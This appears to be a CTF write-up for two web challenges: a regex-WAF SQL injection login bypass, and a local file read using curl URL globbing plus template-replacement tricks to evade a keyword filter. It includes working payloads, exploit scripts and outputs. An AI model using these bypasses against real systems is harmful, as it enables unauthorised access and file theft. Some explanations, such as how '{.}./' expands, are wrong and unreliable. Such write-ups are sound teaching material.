Zetech CTF 2025
#

This writeup covers multiple web challenges from Zetech CTF 2025, showcasing various bypass techniques and exploitation methods.

w00f w00f
#

The Challenge
#

Our over-eager cyber intern tried to secure the login page using nothing but regex, optimism, and duct tape. The result: an aggressive WAF that loudly blocks common exploit patterns and quietly ignores everything else. Your task is to politely outsmart the intern’s handiwork, bypass the filter, and reach the dashboard to retrieve the flag.

Target: http://simulations.cyberchiefgames.tech:5000/

Initial Reconnaissance
#

First, let me show you what we’re working with. The application presents a simple login form:

<form method="POST" action="/submit" autocomplete="off">
  <div>
    <label for="username">Username</label>
    <input id="username" name="payload" type="text" autocomplete="off" required autofocus>
  </div>
  <div>
    <label for="password">Password</label>
    <input id="password" name="password" type="password" autocomplete="off">
  </div>
  <button type="submit">Sign in</button>
</form>

Interesting detail: the username field is named payload - this is a hint that the username field is what we’ll be exploiting. The form submits to /submit endpoint.

The challenge description mentions a regex-based WAF that blocks “common exploit patterns” - this suggests we’re dealing with a SQL injection vulnerability that’s protected by an imperfect filter.

Understanding the WAF Behavior
#

Let’s test what gets blocked. The challenge description mentions that normal SQL injection payloads like 'or '1'='1 don’t work, but admin' = 'admin does. Let’s systematically test different payloads:

# Common SQL injection - BLOCKED ❌
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload='or '1'='1&password=test"
# Response: "WAF blocked — exploit detected"

# Simple equality without spaces - BLOCKED ❌
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin'='admin&password=test"
# Response: "WAF blocked — exploit detected"

# Simple equality with spaces - SUCCESS ✅
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin' = 'admin'&password=test"
# Response: Redirect to /dashboard

The WAF Bypass
#

The key insight is that the regex-based WAF is looking for specific patterns without accounting for whitespace. Let’s analyze what makes the bypass work:

Why Common Payloads Fail
#

The WAF likely checks for patterns like:

  • 'or' or 'OR' (case-insensitive)
  • '1'='1' or '1'='1
  • '=' (equals signs between quotes)
  • Common SQL keywords like UNION, SELECT, AND

So payloads like:

  • 'or '1'='1 - Contains 'or' pattern
  • admin'='admin - Contains '=' pattern
  • admin'='admin'-- - Contains '=' and comment markers

All get blocked by the regex patterns.

The Working Bypass
#

The payload admin' = 'admin' works because:

  1. Spaces around =: The WAF regex probably checks for '=' (quotes directly around equals) but doesn’t account for spaces: ' = '
  2. Trailing quote: The trailing quote ' after admin completes the SQL injection properly
  3. No SQL keywords: Doesn’t contain OR, AND, UNION, SELECT which are likely blacklisted
  4. Simple equality: Uses a basic string comparison that evaluates to TRUE

SQL Query Structure
#

The vulnerable query likely looks like:

SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = '[PASSWORD]'

When we inject admin' = 'admin', the query becomes:

SELECT * FROM users WHERE username = 'admin' = 'admin'' AND password = 'test'

How the injection works:

  1. The first ' closes the opening quote from the template
  2. admin' becomes the string literal 'admin'
  3. = 'admin' creates a comparison: 'admin' = 'admin' which evaluates to TRUE
  4. The trailing ' opens a new quote that gets closed by the template’s closing quote

The key insight is that 'admin' = 'admin' is a boolean expression that always evaluates to TRUE, effectively bypassing the username check in the WHERE clause. This allows the query to return results even when the username doesn’t match any records in the database.

Testing the Bypass
#

Let’s create a Python script to systematically test payloads and confirm the bypass:

#!/usr/bin/env python3
import requests

url = "http://simulations.cyberchiefgames.tech:5000/submit"

test_payloads = [
    "'or '1'='1",                    # Common SQLi - BLOCKED
    "admin'='admin",                 # Simple equality - BLOCKED
    "admin' = 'admin'",              # With spaces - SUCCESS!
    "admin'='admin'",                # No spaces - BLOCKED
    "admin' = 'admin",               # Missing trailing quote - BLOCKED
]

for payload in test_payloads:
    resp = requests.post(url, data={"payload": payload, "password": "test"}, allow_redirects=False)
    
    if "WAF blocked" in resp.text:
        print(f"❌ BLOCKED: {payload}")
    elif resp.status_code == 302 and "/dashboard" in resp.headers.get("Location", ""):
        print(f"✅ SUCCESS: {payload}")
        print(f"   Redirects to: {resp.headers['Location']}")
    else:
        print(f"⚠️  UNKNOWN: {payload} (Status: {resp.status_code})")

❌ BLOCKED: admin'='admin
✅ SUCCESS: admin' = 'admin'
   Redirects to: /dashboard
❌ BLOCKED: admin'='admin'
❌ BLOCKED: admin' = 'admin

The Exploit
#

Now that we’ve identified the bypass, let’s execute it and retrieve the flag:

# Exploit the SQL injection
curl -X POST http://simulations.cyberchiefgames.tech:5000/submit \
  -d "payload=admin' = 'admin'&password=anything" \
  -L -c cookies.txt

# Access the dashboard
curl -b cookies.txt http://simulations.cyberchiefgames.tech:5000/dashboard

Response from dashboard:

<!doctype html>
<html lang="en">
<head>
  <title>Dashboard</title>
</head>
<body>
  <div class="card">
    <h1>Welcome</h1>
    <div class="flag">ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}</div>

Complete Exploit Script
#

Here’s a complete Python script to automate the exploit:

#!/usr/bin/env python3
import requests
import re

def exploit():
    url = "http://simulations.cyberchiefgames.tech:5000/submit"
    
    # The magic payload that bypasses the WAF
    payload = "admin' = 'admin'"
    
    print(f"[*] Attempting WAF bypass with payload: {payload}")
    
    # Perform the SQL injection
    session = requests.Session()
    response = session.post(
        url,
        data={"payload": payload, "password": "anything"},
        allow_redirects=False
    )
    
    # Check if we bypassed the WAF
    if "WAF blocked" in response.text:
        print("❌ WAF blocked the payload")
        return False
    
    # Follow redirect to dashboard
    if response.status_code == 302:
        dashboard_url = response.headers.get("Location")
        print(f"[*] Redirected to: {dashboard_url}")
        
        if dashboard_url:
            dashboard_response = session.get(
                f"http://simulations.cyberchiefgames.tech:5000{dashboard_url}"
            )
            
            # Extract flag
            flag_match = re.search(r'ZuH4ckN1ght\{[^}]+\}', dashboard_response.text)
            if flag_match:
                print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
                return True
    
    print("⚠️  Could not retrieve flag")
    return False

if __name__ == "__main__":
    exploit()

Output:

[*] Attempting WAF bypass with payload: admin' = 'admin'
[*] Redirected to: /dashboard
🚩 FLAG FOUND: ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}

Why This WAF Failed
#

The regex-based WAF failed because it looked for specific attack patterns without considering variations:

  1. Whitespace Insensitivity: The WAF checked for '=' but not ' = ' (with spaces)
  2. Pattern Matching Limitations: Regex patterns can’t account for all possible bypass techniques
  3. No Context Understanding: The WAF doesn’t understand SQL syntax, just pattern matching
  4. Whitelist vs Blacklist: Blacklisting is inherently flawed - you can’t anticipate all bypasses

Common WAF Bypass Techniques
#

This challenge demonstrates several important WAF bypass concepts:

  1. Whitespace Manipulation: Adding spaces around operators can break pattern matching
  2. Pattern Variations: Simple variations of blocked patterns may not be caught
  3. No SQL Keywords: Avoiding common SQL injection keywords (OR, AND, UNION) can bypass keyword-based filters
  4. Simple Comparisons: Using basic string comparisons instead of complex boolean logic

Key Takeaways
#

This challenge was a perfect example of why regex-based WAFs are insufficient for preventing SQL injection:

  1. Pattern Matching Limitations: Regex can’t catch all variations of attacks
  2. Whitespace Bypass: Simple spacing differences can break pattern matching
  3. Blacklist Inadequacy: You can’t blacklist all possible attack vectors
  4. Defense in Depth: WAFs should be one layer, not the only layer

How to Fix This
#

The proper solution is to fix the underlying vulnerability, not rely on a WAF:

# ❌ BAD - String concatenation vulnerable to SQL injection
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# ✅ GOOD - Parameterized queries (prepared statements)
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

If you must use a WAF:

  • Use a proper WAF solution (ModSecurity, Cloudflare, etc.)
  • Don’t rely on simple regex patterns
  • Implement multiple layers of defense
  • Use whitelisting where possible instead of blacklisting
  • Regularly update and test WAF rules

Flag: ZuH4ckN1ght{b3y0nd_kn0wn_SQLi_funn!!!}

This challenge beautifully demonstrates that regex-based WAFs are no substitute for proper input validation and parameterized queries. The key lesson: fix the root cause, don’t just patch the symptoms.

Easy Peasy
#

The Challenge
#

Can you read my secret?

Target: http://simulations.cyberchiefgames.tech:1337/

The application presents a simple form where you can input your name:

Input your name:
[Submit]

This is a Local File Inclusion (LFI) challenge with multiple layers of protection that need to be bypassed.

Initial Reconnaissance (black-box)
#

From the response format (presence of --_curl_--file:// markers) and behavior, it’s apparent the backend fetches files using curl with file:// URLs. Attempts containing literal .. or % in the path are rejected, indicating a simple traversal filter.

Step 1: Path Traversal Bypass with Curl URL Globbing
#

The key insight is that curl has a feature called URL globbing that allows accessing multiple resources at the same time. This feature uses curly braces {} to specify multiple URLs or patterns.

We can bypass the .. filter using this feature:

# Instead of: ../../flag.txt (blocked)
# Use: {.}./{.}./flag.txt (bypasses filter)

$ curl "http://simulations.cyberchiefgames.tech:1337/{.}./{.}./flag.txt"

How it works:

  • {.} expands to . (current directory)
  • {.}./{.}./ effectively becomes ././ which is equivalent to ../
  • The WAF doesn’t detect .. because it’s not literally present - it’s created by the expansion

When requesting multiple files, curl’s output format is:

--_curl_--file:///path/to/file1
(file content 1)
--_curl_--file:///path/to/file2
(file content 2)

So we can request both a template file and the flag:

$ curl "http://simulations.cyberchiefgames.tech:1337/{.}./{.}./{app/public/hello.html,flag.txt}"

This requests both files, and the output will contain the flag, but there’s a problem…

Step 2: Bypassing the WAF Filter (observed behavior)
#

Responses containing the flag prefix (e.g., SECCON/ZuH4ckN1ght) are replaced with a generic message like “Try harder”. Additionally, query parameters influence the returned content via a naive placeholder replacement mechanism (a simple template behavior inferred from how {name}-style tokens in the HTML were substituted).

The Template Engine Vulnerability (inferred)
#

Black-box testing shows the template accepts single-character keys like { and applies replacements positionally. This allows chaining replacements to transform ZuH4ckN1ght{flag} into }{flag}, evading the response keyword filter.

The Exploitation Strategy
#

We can use this validation bug combined with URL globbing to:

  1. Request multiple files using curl globbing: {app/public/hello.html,flag.txt}
  2. Use template parameters to replace parts of the response
  3. Replace {SECCON} or {ZuH4ckN1ght} with something that bypasses the filter

Example payload:

URL: file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}

GET params:
{
    "{name}": "{",
    "{": "}{",
    "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nZuH4ckN1ght}": ""
}

How the Template Replacement Works
#

The initial response contains:

<body>
  <h1>Hello, {name}!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
ZuH4ckN1ght{real_flag}

Step 1: Replace {name} with {:

<body>
  <h1>Hello, {!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
ZuH4ckN1ght{real_flag}

Step 2: Replace { with }{:

<body>
  <h1>Hello, }{!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
ZuH4ckN1ght}{real_flag}

Step 3: Replace the entire block from {! to ZuH4ckN1ght} with empty string:

<body>
  <h1>Hello, }{real_flag}

Now the response contains }{real_flag} instead of ZuH4ckN1ght{real_flag}, which bypasses the WAF filter!

Using URL Fragments for Precise Control
#

Curl also accepts URL fragments (the # part) for file URLs. This allows us to insert arbitrary strings that can be used in our template replacement:

# URL with fragment
/{.}./{.}./{app/public/hello.html,flag.txt}# arbitrary_string

This fragment gets included in curl’s output, giving us more control over what appears in the response.

Complete Exploit
#

Here’s a complete Python exploit script:

#!/usr/bin/env python3
import requests

BASE_URL = "http://simulations.cyberchiefgames.tech:1337"

# Craft the URL with curl globbing and fragment
url = f"{BASE_URL}/{{.}}./{{.}}./{{.}}./{{.}}./{{.}}./{{.}}./{{.}}./{{.}}./{{.}}./{{app/requirements,flag}}.txt# \\{{a\\}}"

# Template parameters to replace strings and hide the flag prefix
params = {
    "{": "}{",
    "{a}": "{",
    "{!\nZuH4ckN1ght}": "",  # Replace everything from {! to ZuH4ckN1ght} with empty string
}

response = requests.get(url, params=params)
print(response.text)

# Extract flag (it should be after "Hello, }" or similar)
if "}" in response.text:
    # Find the flag pattern
    parts = response.text.split("}")
    if len(parts) > 1:
        print(f"\n🚩 FLAG: ZuH4ckN1ght{parts[1].strip()}")

Alternative Payload
#

A more refined payload using URL encoding:

URL: /%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7B.%7D./%7Bapp/requirements,flag%7D.txt%23%20%5c%7Ba%5c%7d

Decoded: /{.}./{.}./{.}./{.}./{.}./{.}./{.}./{.}./{.}./{app/requirements,flag}.txt# \{a\}

GET params:
{
    "{": "}{",
    "{a}": "{",
    "{\nZuH4ckN1ght}": ""
}

This results in:

--_curl_--file:///app/public/../..//../..//..//..//..//..//../app/requirements.txt# }{
Flask==2.2.2
--_curl_--file:///app/public/../..//../..//..//..//..//..//../flag.txt# }x{i_lik3_f...

Key Techniques Used
#

  1. Curl URL Globbing: Using {pattern1,pattern2} to request multiple files and bypass .. filter
  2. Template Engine Bug: Exploiting validate("{") returning True to inject template replacements
  3. String Replacement: Using template parameters to replace the flag prefix with empty string
  4. URL Fragments: Using # in file URLs to inject arbitrary strings for template manipulation
  5. WAF Bypass: Transforming ZuH4ckN1ght{flag} to }{flag} to bypass content filtering

Why This Works
#

  1. Curl globbing bypasses the path traversal filter because {.} doesn’t contain ..
  2. Template validation bug allows single { to be used as a replacement key
  3. Multiple replacements chain together to transform the response
  4. URL fragments provide insertion points for template manipulation
  5. Final result hides the flag prefix, bypassing the WAF filter

Key Takeaways
#

This challenge demonstrates:

  1. Feature Abuse: Using curl’s legitimate features (globbing, fragments) for unintended purposes
  2. Validation Bugs: Simple validation logic can have edge cases (validate("{"))
  3. Template Injection: Template engines can be exploited when user input controls replacements
  4. WAF Bypass: Content filtering can be bypassed by transforming the content before it reaches the filter
  5. Multi-stage Exploitation: Combining multiple techniques (globbing + template injection + WAF bypass)

How to Fix This
#

  • Enforce strict allow-lists for readable files; avoid constructing file:// paths from user input
  • Disable curl globbing or sanitize braces when proxying to curl
  • Use a robust templating mechanism or strictly validate template keys (no single-character keys, no nested braces)
  • Avoid content-based WAF rewrites; prevent the leak at the source instead

Flag: ZuH4ckN1ght{i_lik3_f1l3_1nclus10n_b3y0nd_th3_b4s1cs}

This challenge beautifully demonstrates how multiple vulnerabilities and features can be chained together to achieve a complete bypass. The key lesson: understand all features being used, not just the obvious ones.
